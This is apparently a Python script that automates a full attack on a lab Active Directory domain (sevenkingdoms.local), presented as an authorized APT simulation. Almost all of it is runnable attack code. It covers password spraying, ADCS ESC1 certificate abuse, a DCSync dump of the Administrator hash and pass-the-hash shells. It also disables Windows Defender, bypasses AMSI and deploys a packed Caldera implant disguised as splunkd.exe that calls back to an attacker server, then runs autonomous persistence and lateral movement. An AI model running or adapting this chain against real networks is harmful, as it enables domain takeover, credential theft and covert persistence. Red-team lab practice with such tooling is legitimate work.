"""
This script is responsible for automating the attack on the target machine (192.168.56.10).
The scenario starts with an "assumed breach", where the attacker has already gained initial access to the internal network (192.168.56.0/24).
The attacker has some valid credentials, but needs to spray them to find a working combination.

Here are the relevant IP addresses
- Attacker Machine: 192.168.56.100
- Target Machine: 192.168.56.10 (KINGSLANDING$)

The attack takes form in the following steps:
1. Attacker runs an nmap scan on 192.168.56.10
2. Attacker attempts NULL authentication against 192.168.56.10
3. Attacker attempts to spray credentials against robert.baratheon (Domain Admin), ends up locking the account
4. Attacker conducts a password spray against all known accounts instead to prevent further lockouts, getting a successful login on jaime.lannister
5. Attacker dumps users, groups, and runs multiple enumeration scripts to gather information
6. Attacker enumerates ADCS and discovers a Certificate Template that can be abused to request a certificate as Domain Admin
7. Attacker requests a certificate for cersei.lannister using the discovered template (ESC1)
8. Attacker uses the certificate to authenticate as Domain Admin and dump the entire Active Directory database (DCSync)
9. Attacker starts authenticating as Administrator, running some sample commands and modules
10. Attacker runs the Caldera implant on the target machine
11. A caldera operation is triggered, running multiple defense-evasion techniques
12. Another caldera operation is triggered, running multiple post-exploitation techniques (persistence, credential access, discovery, lateral movement)
"""
import os
import re
import time
import subprocess
from datetime import datetime
from typing import Tuple

from colorama import Fore, Style, init
from requests import Session

# Global config
BYPASS_WAIT = False
CALDERA_URL = "http://127.0.0.1:8888"
API_KEY = "ADMIN123"  # ! Default Caldera API key

# Initialize colorama
init(autoreset=True)

# Helper functions
def get_timestamp() -> str:
    """Get formatted timestamp for logging."""
    return f"{Fore.WHITE}[{datetime.now().strftime('%H:%M:%S')}]{Style.RESET_ALL}"

def log(message: str, prefix: str = ""):
    """Print message with timestamp prefix."""
    if prefix:
        print(f"{get_timestamp()} {prefix} {message}")
    else:
        print(f"{get_timestamp()} {message}")

def print_step_header(step_num: int, title: str):
    """Print a visually appealing step header."""
    print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    log(f"{Fore.YELLOW}{Style.BRIGHT}📍 STEP {step_num}: {title.upper()}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")

def run_command(command: str) -> Tuple[bool, str]:
    """Run a shell command, wait for it to complete, and return the output."""

    if not BYPASS_WAIT:
        sleep_time = round(len(command) * 0.5) + (os.urandom(1)[0] % 3)
        log(f"{Fore.MAGENTA}⏱️  [*] Throttling for {sleep_time}s...{Style.RESET_ALL}")
        time.sleep(sleep_time)

    # Truncate command for display if too long
    display_cmd = command
    log(f"{Fore.BLUE}🔧 [→] Executing: {Style.BRIGHT}{display_cmd}{Style.RESET_ALL}")

    start_time = time.time()
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    elapsed = time.time() - start_time

    if result.returncode != 0:
        log(f"{Fore.RED}❌ [✗] Command failed (exit code: {result.returncode}) - {elapsed:.2f}s{Style.RESET_ALL}")
        if result.stderr:
            print(f"{get_timestamp()} {Fore.RED}    └─ Error: {result.stderr[:200]}{Style.RESET_ALL}")
        return False, result.stderr

    log(f"{Fore.GREEN}✅ [✓] Command completed successfully - {elapsed:.2f}s{Style.RESET_ALL}")
    return True, result.stdout

# ============================================================================
# ATTACK CHAIN EXECUTION
# ============================================================================

# Print banner
print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
print(f"""{Fore.RED}{Style.BRIGHT}
   ▄████  ▒█████   ▄▄▄      ▓█████▄     ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀
  ██▒ ▀█▒▒██▒  ██▒▒████▄    ▒██▀ ██▌   ▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
 ▒██░▄▄▄░▒██░  ██▒▒██  ▀█▄  ░██   █▌   ▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
 ░▓█  ██▓▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌   ░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
 ░▒▓███▀▒░ ████▓▒░ ▓█   ▓██▒░▒████▓     ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
  ░▒   ▒ ░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒     ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
   ░   ░   ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒      ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ░ ░   ░ ░ ░ ░ ▒    ░   ▒    ░ ░  ░      ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░ 
       ░     ░ ░        ░  ░   ░             ░  ░                        ░  ░░ ░      ░  ░   
                              ░                                              ░               
{Style.RESET_ALL}""")
print(f"{Fore.YELLOW}{Style.BRIGHT}                   Advanced Persistent Threat Simulation Framework{Style.RESET_ALL}")
print(f"{Fore.CYAN}                           Target: Seven Kingdoms Domain{Style.RESET_ALL}")
print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")

print(f"{Fore.YELLOW}⚔️  Mission Brief:{Style.RESET_ALL}")
print(f"{Fore.CYAN}   └─ Scenario: {Style.BRIGHT}Assumed Breach{Style.RESET_ALL}")
print(f"{Fore.CYAN}   └─ Starting Point: {Style.BRIGHT}Internal Network Access (192.168.56.0/24){Style.RESET_ALL}")
print(f"{Fore.CYAN}   └─ Primary Target: {Style.BRIGHT}192.168.56.10 (KINGSLANDING - Domain Controller){Style.RESET_ALL}")
print(f"{Fore.CYAN}   └─ Domain: {Style.BRIGHT}sevenkingdoms.local{Style.RESET_ALL}")
print(f"{Fore.CYAN}   └─ Objective: {Style.BRIGHT}Full Domain Compromise & C2 Operation{Style.RESET_ALL}\n")

print(f"{Fore.YELLOW}🎯 Attack Phases:{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}   [Phase 1] {Fore.WHITE}Network Reconnaissance{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}   [Phase 2] {Fore.WHITE}Initial Access (Credential Discovery){Style.RESET_ALL}")
print(f"{Fore.MAGENTA}   [Phase 3] {Fore.WHITE}Active Directory Enumeration{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}   [Phase 4] {Fore.WHITE}Privilege Escalation (ADCS ESC1){Style.RESET_ALL}")
print(f"{Fore.MAGENTA}   [Phase 5] {Fore.WHITE}Domain Compromise (DCSync){Style.RESET_ALL}")
print(f"{Fore.MAGENTA}   [Phase 6] {Fore.WHITE}Post-Exploitation{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}   [Phase 7] {Fore.WHITE}C2 Infrastructure Deployment{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}   [Phase 8] {Fore.WHITE}Autonomous APT Simulation{Style.RESET_ALL}\n")

print(f"{Fore.RED}{Style.BRIGHT}⚠️  WARNING: This is an authorized security assessment simulation.{Style.RESET_ALL}")
print(f"{Fore.RED}   Unauthorized use is illegal and unethical.{Style.RESET_ALL}\n")

print(f"{Fore.GREEN}🚀 Initiating attack sequence...{Style.RESET_ALL}\n")
time.sleep(2)

print_step_header(1, "Network Reconnaissance - Nmap Scan")
log(f"{Fore.CYAN}🎯 Target: 192.168.56.10 (KINGSLANDING){Style.RESET_ALL}")
log(f"{Fore.CYAN}📡 Scan Type: SYN Stealth Scan (Fast){Style.RESET_ALL}\n")
run_command("nmap -sS -T5 -Pn -n 192.168.56.10")

print_step_header(2, "NULL Authentication Attempt")
log(f"{Fore.CYAN}🔓 Attempting anonymous SMB access...{Style.RESET_ALL}\n")
run_command("nxc smb 192.168.56.10 -u '' -p ''")

print_step_header(3, "Targeted Credential Attack - Domain Admin")
log(f"{Fore.CYAN}👤 Target User: robert.baratheon (Domain Admin){Style.RESET_ALL}")
log(f"{Fore.YELLOW}⚠️  Warning: This attack will likely trigger account lockout{Style.RESET_ALL}\n")
run_command("nxc smb 192.168.56.10 -u 'robert.baratheon' -p /home/kali/passwords.txt")

print_step_header(4, "Horizontal Password Spray")
log(f"{Fore.CYAN}🎲 Testing single password across multiple accounts...{Style.RESET_ALL}")
log(f"{Fore.CYAN}💡 Strategy: Prevent lockouts by limiting attempts{Style.RESET_ALL}\n")
success, output = run_command("nxc smb 192.168.56.10 -u /home/kali/users.txt -p 'cersei'")
if success and "Pwn3d!" in output:
    log(f"{Fore.GREEN}{Style.BRIGHT}🎉 SUCCESS! Valid credentials found: jaime.lannister:cersei{Style.RESET_ALL}\n")

print_step_header(5, "Active Directory Enumeration")
log(f"{Fore.CYAN}🔍 Collecting domain intelligence...{Style.RESET_ALL}")
log(f"{Fore.CYAN}📊 Gathering: Users, Groups, Computers, GPOs, BloodHound data{Style.RESET_ALL}\n")
run_command("nxc ldap 192.168.56.10 -u 'jaime.lannister' -p 'cersei' --users --groups --computers --dc-list --get-sid --bloodhound -c All --dns-server 192.168.56.10 -d sevenkingdoms.local")
log(f"\n{Fore.CYAN}📝 Extracting user descriptions...{Style.RESET_ALL}\n")
run_command("nxc ldap 192.168.56.10 -u 'jaime.lannister' -p 'cersei' -M get-desc-users")
log(f"\n{Fore.CYAN}🔑 Checking for LAPS passwords...{Style.RESET_ALL}\n")
run_command("nxc ldap 192.168.56.10 -u 'jaime.lannister' -p 'cersei' -M laps")

print_step_header(6, "ADCS Vulnerability Discovery")
log(f"{Fore.CYAN}🔐 Scanning for vulnerable certificate templates...{Style.RESET_ALL}")
log(f"{Fore.CYAN}🎯 Attack Vector: ESC1 - Certificate Request with UPN{Style.RESET_ALL}\n")
run_command("nxc ldap 192.168.56.10 -u 'jaime.lannister' -p 'cersei' -M adcs")
log(f"\n{Fore.CYAN}📜 Deep-diving vulnerable templates with Certipy...{Style.RESET_ALL}\n")
run_command("certipy-ad find -u 'jaime.lannister@sevenkingdoms.local' -p 'cersei' -vulnerable -enabled -ns 192.168.56.10 -stdout")

print_step_header(7, "Certificate-Based Privilege Escalation (ESC1)")
log(f"{Fore.CYAN}🎟️  Requesting certificate for: cersei.lannister (Domain Admin){Style.RESET_ALL}")
log(f"{Fore.CYAN}📋 Template: ESC1{Style.RESET_ALL}")
log(f"{Fore.CYAN}🏛️  CA: SEVENKINGDOMS-CA{Style.RESET_ALL}\n")
run_command("yes | certipy-ad req -u 'jaime.lannister@sevenkingdoms.local' -p 'cersei' -target kingslanding.sevenkingdoms.local -ns 192.168.56.10 -ca 'SEVENKINGDOMS-CA' -template 'ESC1' -upn 'cersei.lannister@sevenkingdoms.local' -out cersei.pfx")
log(f"\n{Fore.CYAN}🔓 Authenticating with certificate to extract NTLM hash...{Style.RESET_ALL}\n")
cersei_ntlm = run_command("yes | certipy-ad auth -pfx ./cersei.pfx -dc-ip 192.168.56.10 -ns 192.168.56.10")[1].split(":")[-1].strip()
log(f"\n{Fore.GREEN}{Style.BRIGHT}🎉 PRIVILEGE ESCALATION SUCCESSFUL!{Style.RESET_ALL}")
log(f"{Fore.YELLOW}💎 NTLM Hash (cersei.lannister): {cersei_ntlm}{Style.RESET_ALL}\n")

print_step_header(8, "Domain Compromise - DCSync Attack")
log(f"{Fore.CYAN}👑 Authenticating as Domain Admin: cersei.lannister{Style.RESET_ALL}")
log(f"{Fore.CYAN}🎯 Objective: Extract entire AD database (NTDS.dit){Style.RESET_ALL}\n")
run_command(f"nxc smb 192.168.56.10 -u 'cersei.lannister' -H '{cersei_ntlm}'")
log(f"\n{Fore.CYAN}💾 Executing DCSync to dump all domain credentials...{Style.RESET_ALL}\n")
dcsync_output = run_command(f"yes | nxc smb 192.168.56.10 -u 'cersei.lannister' -H '{cersei_ntlm}' --ntds --user Administrator")

# Extract "Administrator:500:<hash>:<hash>:::"
log(f"\n{Fore.CYAN}🔍 Parsing DCSync output for Administrator hash...{Style.RESET_ALL}")
admin_hash = re.search(r'Administrator:500:([^\s:]+):([^\s:]+):::', dcsync_output[1])
if admin_hash:
    admin_ntlm = f"{admin_hash.group(1)}:{admin_hash.group(2)}"
    log(f"{Fore.GREEN}{Style.BRIGHT}🎊 DOMAIN FULLY COMPROMISED!{Style.RESET_ALL}")
    log(f"{Fore.YELLOW}👑 Administrator Hash: {admin_ntlm}{Style.RESET_ALL}\n")
else:
    log(f"{Fore.RED}❌ Failed to extract Administrator hash{Style.RESET_ALL}\n")
    exit(1)

print_step_header(9, "Post-Exploitation - Credential Harvesting")
log(f"{Fore.CYAN}🔐 Authenticating as Administrator...{Style.RESET_ALL}\n")
run_command(f"nxc smb 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}'")

log(f"\n{Fore.CYAN}🖥️  Testing interactive shell access via Evil-WinRM...{Style.RESET_ALL}\n")
run_command(f"printf 'whoami\nexit' | evil-winrm -i 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}' || return 0")

print_step_header(10, "Caldera Implant Deployment")
log(f"{Fore.CYAN}🔻 Downloading Sandcat agent from Caldera server...{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Platform: Windows (x64){Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Target Group: red{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Callback Server: http://192.168.56.100:8888{Style.RESET_ALL}\n")
run_command("curl -sk -X POST -H 'platform:windows' -H 'file:sandcat.go' -H 'architecture:amd64' -H 'server:http://192.168.56.100:8888' -H 'group:red' http://127.0.0.1:8888/file/download --output splunkd.exe")

log(f"\n{Fore.CYAN}📦 Obfuscating implant with UPX packer...{Style.RESET_ALL}\n")
run_command("upx --best ./splunkd.exe")

log(f"\n{Fore.CYAN}🚀 Deploying and executing implant on target...{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Disabling Windows Defender{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Bypassing AMSI{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Uploading to: C:\\Program Files\\splunkd.exe{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Spawning process via WMIC{Style.RESET_ALL}\n")
run_command(f'printf \'cd "/Program Files"\\nBypass-4MSI\\nSet-MpPreference -DisableIntrusionPreventionSystem 1;Set-MpPreference -DisableIOAVProtection 1;Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -DisableScriptScanning 1;Set-MpPreference -EnableControlledFolderAccess Disabled;\\nStart-Sleep -Seconds 5\\nupload splunkd.exe\\nStart-Sleep -Seconds 5\\nwmic process call create "C:\\Program Files\\splunkd.exe"\\nStart-Sleep -Seconds 30\\nexit\\n\' | evil-winrm -i 192.168.56.10 -u \'Administrator\' -H \'{admin_hash.group(2)}\'')

print_step_header(11, "Caldera C2 Operation - APT Simulation")
log(f"{Fore.CYAN}⚙️  Initializing Caldera API connection...{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Endpoint: {CALDERA_URL}{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Authentication: API Key{Style.RESET_ALL}\n")

s = Session()
s.headers.update({"KEY": API_KEY, "Content-Type": "application/json"})

# 1. Check that Caldera is healthy and running
log(f"{Fore.CYAN}🏥 Checking Caldera health...{Style.RESET_ALL}")
try:
    health_response = s.get(f"{CALDERA_URL}/api/v2/health")
    health_response.raise_for_status()
    health_data = health_response.json()
    log(f"{Fore.GREEN}✅ [✓] Caldera is healthy! Version: {health_data.get('version', 'unknown')}{Style.RESET_ALL}")
except Exception as e:
    log(f"{Fore.RED}❌ [✗] Failed to connect to Caldera: {e}{Style.RESET_ALL}")
    exit(1)

# 2. Wait for the agent to appear online
log(f"\n{Fore.CYAN}👁️  Waiting for agent to check-in (group: 'red')...{Style.RESET_ALL}")
agent_paw = None
max_wait = 120  # Wait up to 2 minutes
wait_interval = 5
elapsed = 0

while elapsed < max_wait:
    try:
        agents_response = s.get(f"{CALDERA_URL}/api/v2/agents")
        agents_response.raise_for_status()
        agents = agents_response.json()

        # Find agent in "red" group
        red_agents = [agent for agent in agents if agent.get("group") == "red"]

        if red_agents:
            agent_paw = red_agents[0].get("paw")
            agent_host = red_agents[0].get('host', 'unknown')
            agent_platform = red_agents[0].get('platform', 'unknown')
            log(f"{Fore.GREEN}✅ [✓] Agent found online!{Style.RESET_ALL}")
            log(f"{Fore.YELLOW}   └─ PAW: {agent_paw}{Style.RESET_ALL}")
            log(f"{Fore.YELLOW}   └─ Host: {agent_host}{Style.RESET_ALL}")
            log(f"{Fore.YELLOW}   └─ Platform: {agent_platform}{Style.RESET_ALL}\n")
            break

        log(f"{Fore.YELLOW}⏳ [⏳] No agents found yet, waiting {wait_interval}s... ({elapsed}/{max_wait}s){Style.RESET_ALL}")
        time.sleep(wait_interval)
        elapsed += wait_interval
    except Exception as e:
        log(f"{Fore.RED}❌ [✗] Error checking for agents: {e}{Style.RESET_ALL}")
        time.sleep(wait_interval)
        elapsed += wait_interval

if not agent_paw:
    log(f"{Fore.RED}❌ [✗] Timeout waiting for agent to come online{Style.RESET_ALL}")
    exit(1)

# 2.5. Configure agent beacon timers
log(f"\n{Fore.CYAN}⏱️  Configuring agent beacon intervals...{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Sleep Min: 10 seconds{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Sleep Max: 30 seconds{Style.RESET_ALL}\n")

try:
    agent_config = {
        "sleep_min": 10,
        "sleep_max": 30
    }
    beacon_response = s.patch(f"{CALDERA_URL}/api/v2/agents/{agent_paw}", json=agent_config)
    beacon_response.raise_for_status()
    log(f"{Fore.GREEN}✅ [✓] Agent beacon timers configured successfully{Style.RESET_ALL}\n")
except Exception as e:
    log(f"{Fore.YELLOW}⚠️  [!] Warning: Failed to configure beacon timers: {e}{Style.RESET_ALL}")
    log(f"{Fore.YELLOW}   └─ Continuing with default settings...{Style.RESET_ALL}\n")

# 3. Create an operation
log(f"{Fore.CYAN}🎬 Creating autonomous operation...{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Name: APT Simulation{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Adversary: 81bbd0e8-75ea-4520-b4ad-4d9fbb19a79f{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Planner: atomic (autonomous){Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Jitter: 2/8 seconds{Style.RESET_ALL}\n")

operation_payload = {
    "name": "APT Simulation",
    "adversary": {
        "adversary_id": "81bbd0e8-75ea-4520-b4ad-4d9fbb19a79f"
    },
    "group": "red",
    "source": {
        "id": "ed32b9c3-9593-4c33-b0db-e2007315096b"
    },
    "planner": {
        "id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"
    },
    "obfuscator": "plain-text",
    "autonomous": 1,
    "auto_close": True,
    "state": "running",
    "jitter": "2/8"
}

operation_response = None
try:
    operation_response = s.post(f"{CALDERA_URL}/api/v2/operations", json=operation_payload)
    operation_response.raise_for_status()
    operation_data = operation_response.json()
    operation_id = operation_data.get("id")
    log(f"{Fore.GREEN}✅ [✓] Operation created successfully!{Style.RESET_ALL}")
    log(f"{Fore.YELLOW}   └─ Operation ID: {Style.BRIGHT}{operation_id}{Style.RESET_ALL}\n")
except Exception as e:
    log(f"{Fore.RED}❌ [✗] Failed to create operation: {e}{Style.RESET_ALL}")
    if operation_response:
        print(f"{get_timestamp()} {Fore.RED}   └─ Response: {operation_response.text}{Style.RESET_ALL}")
    exit(1)

# 4. Watch as the operation executes
print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
log(f"{Fore.YELLOW}{Style.BRIGHT}📊 OPERATION EXECUTION MONITOR{Style.RESET_ALL}")
print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")

seen_links = set()
operation_finished = False
check_interval = 10

# Status codes: -3=queued, -2=discarded, -1=error, 0=success, 1=executing
status_map = {
    -3: (f"{Fore.YELLOW}QUEUED{Style.RESET_ALL}", "⏳"),
    -2: (f"{Fore.MAGENTA}DISCARDED{Style.RESET_ALL}", "🚫"),
    -1: (f"{Fore.RED}ERROR{Style.RESET_ALL}", "❌"),
    0: (f"{Fore.GREEN}SUCCESS{Style.RESET_ALL}", "✅"),
    1: (f"{Fore.BLUE}EXECUTING{Style.RESET_ALL}", "🔄")
}

while not operation_finished:
    try:
        time.sleep(check_interval)

        # Get operation status
        op_response = s.get(f"{CALDERA_URL}/api/v2/operations/{operation_id}")
        op_response.raise_for_status()
        op_data = op_response.json()

        operation_state = op_data.get("state", "unknown")

        # Get all links for this operation
        links_response = s.get(f"{CALDERA_URL}/api/v2/operations/{operation_id}/links")
        links_response.raise_for_status()
        links = links_response.json()

        # Print new links
        for link in links:
            link_id = link.get("id")
            if link_id not in seen_links:
                seen_links.add(link_id)

                ability_name = link.get("ability", {}).get("name", "Unknown")
                ability_id = link.get("ability", {}).get("ability_id", "N/A")
                technique_id = link.get("ability", {}).get("technique_id", "N/A")
                status = link.get("status", -3)
                paw = link.get("paw", "unknown")

                status_str, icon = status_map.get(status, (f"{Fore.WHITE}UNKNOWN{Style.RESET_ALL}", "❓"))

                log(f"{icon} {Fore.CYAN}[{technique_id}]{Style.RESET_ALL} {Style.BRIGHT}{ability_name}{Style.RESET_ALL}")
                print(f"{get_timestamp()}    └─ Agent: {Fore.YELLOW}{paw[:8]}...{Style.RESET_ALL} | Status: {status_str}")

        # Check if operation is finished
        if operation_state in ["finished", "out_of_time"]:
            operation_finished = True
            print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
            log(f"{Fore.GREEN}{Style.BRIGHT}🎊 Operation completed! Final state: {operation_state.upper()}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")
        elif operation_state == "running":
            # Count links by status
            link_statuses = {}
            for link in links:
                status = link.get("status", -3)
                link_statuses[status] = link_statuses.get(status, 0) + 1

            # Create a status summary
            status_summary = " | ".join([f"{status_map.get(s, ('', ''))[0]}: {count}" for s, count in sorted(link_statuses.items())])
            log(f"\n{Fore.BLUE}⚡ {Style.BRIGHT}Operation Status:{Style.RESET_ALL} {Fore.CYAN}{operation_state.upper()}{Style.RESET_ALL}")
            print(f"{get_timestamp()}    └─ Links: {status_summary}\n")

    except KeyboardInterrupt:
        log(f"\n{Fore.YELLOW}⚠️  [!] Operation monitoring interrupted by user{Style.RESET_ALL}")
        break
    except Exception as e:
        log(f"{Fore.RED}❌ [✗] Error monitoring operation: {e}{Style.RESET_ALL}")
        time.sleep(check_interval)

# 5. End gracefully
print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
log(f"{Fore.GREEN}{Style.BRIGHT}✨ ATTACK SIMULATION COMPLETE ✨{Style.RESET_ALL}")
print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")

log(f"{Fore.YELLOW}📋 Operation Summary:{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Operation ID: {Style.BRIGHT}{operation_id}{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Total Techniques Executed: {Style.BRIGHT}{len(seen_links)}{Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Target: {Style.BRIGHT}192.168.56.10 (KINGSLANDING){Style.RESET_ALL}")
log(f"{Fore.CYAN}   └─ Domain: {Style.BRIGHT}sevenkingdoms.local{Style.RESET_ALL}\n")

log(f"{Fore.GREEN}{Style.BRIGHT}🎯 Attack Chain Summary:{Style.RESET_ALL}")
log(f"{Fore.GREEN}   ✅ Network Reconnaissance{Style.RESET_ALL}")
log(f"{Fore.GREEN}   ✅ Credential Discovery (Password Spray){Style.RESET_ALL}")
log(f"{Fore.GREEN}   ✅ Active Directory Enumeration{Style.RESET_ALL}")
log(f"{Fore.GREEN}   ✅ ADCS Certificate Attack (ESC1){Style.RESET_ALL}")
log(f"{Fore.GREEN}   ✅ Domain Compromise (DCSync){Style.RESET_ALL}")
log(f"{Fore.GREEN}   ✅ Post-Exploitation Activities{Style.RESET_ALL}")
log(f"{Fore.GREEN}   ✅ C2 Implant Deployment{Style.RESET_ALL}")
log(f"{Fore.GREEN}   ✅ Autonomous APT Simulation{Style.RESET_ALL}\n")

print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
log(f"{Fore.GREEN}{Style.BRIGHT}🏆 All objectives achieved. Exiting gracefully.{Style.RESET_ALL}")
print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")
